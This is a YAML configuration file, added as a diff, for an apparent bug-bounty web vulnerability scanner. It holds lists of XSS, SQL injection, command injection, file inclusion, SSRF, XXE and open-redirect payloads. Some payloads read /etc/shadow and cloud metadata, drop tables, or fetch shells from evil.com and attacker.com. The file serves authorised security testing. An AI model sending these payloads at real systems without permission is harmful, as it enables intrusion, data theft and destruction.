@@ -1,0 +1,125 @@
+# Bug Hunter Pro Configuration
+# Author: aldaniyar1978
+
+# Scan settings
+scan:
+  timeout: 10  # Request timeout in seconds
+  max_threads: 5  # Maximum concurrent threads
+  max_depth: 3  # Maximum crawling depth
+  user_agent: "BugHunterPro/1.0 Security Scanner"
+  follow_redirects: true
+  verify_ssl: false
+
+# Groq AI Configuration
+groq:
+  api_key: ""  # Add your Groq API key here
+  model: "mixtral-8x7b-32768"
+  temperature: 0.7
+  max_tokens: 2048
+
+# Vulnerability detection payloads
+payloads:
+  # Cross-Site Scripting (XSS)
+  xss:
+    - '<script>alert(1)</script>'
+    - '"><script>alert(1)</script>'
+    - "'><script>alert(1)</script>"
+    - '<img src=x onerror=alert(1)>'
+    - '<svg/onload=alert(1)>'
+    - 'javascript:alert(1)'
+    - '<iframe src="javascript:alert(1)">'
+    - '<body onload=alert(1)>'
+  
+  # SQL Injection
+  sqli:
+    - "' OR '1'='1"
+    - "' OR 1=1--"
+    - "admin' --"
+    - "' UNION SELECT NULL--"
+    - "1' AND '1'='1"
+    - "1' ORDER BY 1--"
+    - "' OR 'x'='x"
+    - "1; DROP TABLE users--"
+  
+  # Command Injection
+  command_injection:
+    - "; ls -la"
+    - "| whoami"
+    - "& dir"
+    - "; cat /etc/passwd"
+    - "| cat /etc/shadow"
+    - "&& id"
+  
+  # Local File Inclusion (LFI)
+  lfi:
+    - "../../../etc/passwd"
+    - "..\\..\\..\\windows\\system32\\config\\sam"
+    - "....//....//....//etc/passwd"
+    - "/etc/passwd%00"
+    - "file:///etc/passwd"
+  
+  # Remote File Inclusion (RFI)
+  rfi:
+    - "http://evil.com/shell.txt"
+    - "https://attacker.com/backdoor.php"
+  
+  # Server-Side Request Forgery (SSRF)
+  ssrf:
+    - "http://localhost"
+    - "http://127.0.0.1"
+    - "http://169.254.169.254/latest/meta-data/"
+    - "http://metadata.google.internal/"
+  
+  # XML External Entity (XXE)
+  xxe:
+    - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
+  
+  # Open Redirect
+  open_redirect:
+    - "//evil.com"
+    - "https://evil.com"
+    - "/\\evil.com"
+
+# Target patterns to scan
+patterns:
+  forms: true  # Scan HTML forms
+  parameters: true  # Scan URL parameters
+  headers: true  # Test headers
+  cookies: true  # Test cookies
+  post_requests: true  # Test POST requests
+
+# Report settings
+report:
+  format: "json"  # json, html, pdf
+  output_dir: "reports"
+  detailed: true
+  include_screenshots: false
+  severity_levels:
+    - Critical
+    - High
+    - Medium
+    - Low
+    - Info
+
+# Bug bounty platforms
+bug_bounty:
+  platforms:
+    - name: "HackerOne"
+      enabled: true
+    - name: "Bugcrowd"
+      enabled: true
+    - name: "Synack"
+      enabled: false
+    - name: "Intigriti"
+      enabled: true
+
+# Rate limiting
+rate_limit:
+  requests_per_second: 2
+  delay_between_requests: 0.5
+
+# Logging
+logging:
+  level: "INFO"  # DEBUG, INFO, WARNING, ERROR
+  file: "scanner.log"
+  console: true
